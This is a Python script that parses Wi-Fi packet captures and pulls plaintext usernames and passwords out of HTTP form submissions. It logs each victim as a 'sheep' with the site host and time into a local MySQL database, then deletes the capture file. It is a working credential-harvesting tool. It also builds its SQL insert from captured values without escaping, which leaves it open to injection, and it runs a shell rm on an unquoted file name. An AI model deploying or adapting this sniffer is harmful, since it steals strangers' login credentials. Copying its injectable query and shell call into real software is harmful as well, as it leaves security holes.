import pyshark
import pymysql
import sys
import datetime
import os
import pexpect

def analyze(iterator):
	db  = ""
	filename = 'data' + str(iterator) + '.cap'

	cap = pyshark.FileCapture(filename)

	print("analyzing " + filename)

	userNamePatternList = ['"u"','username','userid']
	passwordPatternList = ['"p"','password']

	for pkt in cap:
		if pkt.highest_layer == "URLENCODED-FORM":
			username = ""
			password = ""
			source = ""
			layer = pkt[pkt.highest_layer]
			layer_generator = layer._get_all_field_lines()
			text = ""
			for line in layer_generator:
				text += line
			for usernamePat in userNamePatternList:
				if usernamePat in text:
					prePos = text.find(usernamePat)
					username = text[text.find('=',prePos)+3:text.find('\n\t',prePos)-1]
					break;
			for passwordPat in passwordPatternList:
				if passwordPat in text:
					prePos = text.find(passwordPat)
					password = text[text.find('=',prePos)+3:text.find('\n\t',prePos)-1]
					break;
			if username != "" and password != "":
				source = pkt["HTTP"].get_field("HOST")
				print("We get a sheep")
				print(username,password,source)
				if db == "":
					try:
						db = pymysql.connect(host="localhost",port=8889,user="root",passwd="root",db="wifi-sheep")
					except:
						print("error connect to db")
						sys.exit()

					cursor = db.cursor()
				cursor.execute("insert into wifisheep_userinfo (userName, password, source, time)\
					values ('%s','%s','%s','%s')"%\
					(username,password,source,datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))

	if db != "":
		cursor.close()
		db.commit()
		db.close()
	os.system("rm " + filename)

